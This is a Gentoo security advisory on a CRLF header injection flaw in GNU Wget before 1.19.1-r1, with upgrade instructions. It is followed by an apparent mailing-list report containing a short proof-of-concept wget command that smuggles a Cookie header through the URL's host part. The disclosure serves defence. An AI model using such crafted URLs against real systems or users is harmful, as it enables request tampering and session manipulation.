# GNU Wget: Header injection — GLSA **201706-16**

A header injection vulnerability in GNU Wget might allow remote
attackers to inject arbitrary HTTP headers.

### Affected packages

| Package | **net-misc/wget** on all architectures |
| --- | --- |
| Affected versions | < **1.19.1-r1** |
| Unaffected versions | >= **1.19.1-r1** |

### Background

GNU Wget is a free software package for retrieving files using HTTP,
HTTPS and FTP, the most widely-used Internet protocols.

### Description

It was discovered that there was a header injection vulnerability in GNU
Wget which allowed remote attackers to inject arbitrary HTTP headers via
CRLF sequences in the host subcomponent of a URL.

### Impact

A remote attacker could inject arbitrary HTTP headers in requests by
tricking a user running GNU Wget into processing crafted URLs.

### Workaround

There is no known workaround at this time.

### Resolution

All GNU Wget users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=net-misc/wget-1.19.1-r1"

```

## [Bug-wget] Vulnerability Report - CRLF Injection in Wget Host Part

Hi

I just found that there is a CRLF Injection in the latest version of Wget
1.19.

Wget uses urlencode to encode CRLF in PATH part but doesn't use in HOST
port. So an attacker can inject arbitrary header in the request.

For example:

# This will fail
$ wget '[http://127.0.0.1/%0d%0Cookie:](http://127.0.0.1/%0D%0Cookie%3A) hi'

GET /%0d%0Cookie:%20hi HTTP/1.1
User-Agent: Wget/1.19 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 127.0.0.1
Connection: Keep-Alive

# This will work
$ wget '<http://127.0.0.1%0d%0aCookie%3a> hi%0a/'

GET / HTTP/1.1
User-Agent: Wget/1.19 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: [127.0.0.1
*cookie: hi*
]
Connection: Keep-Alive

Wish you aware this, thanks for your reading :)
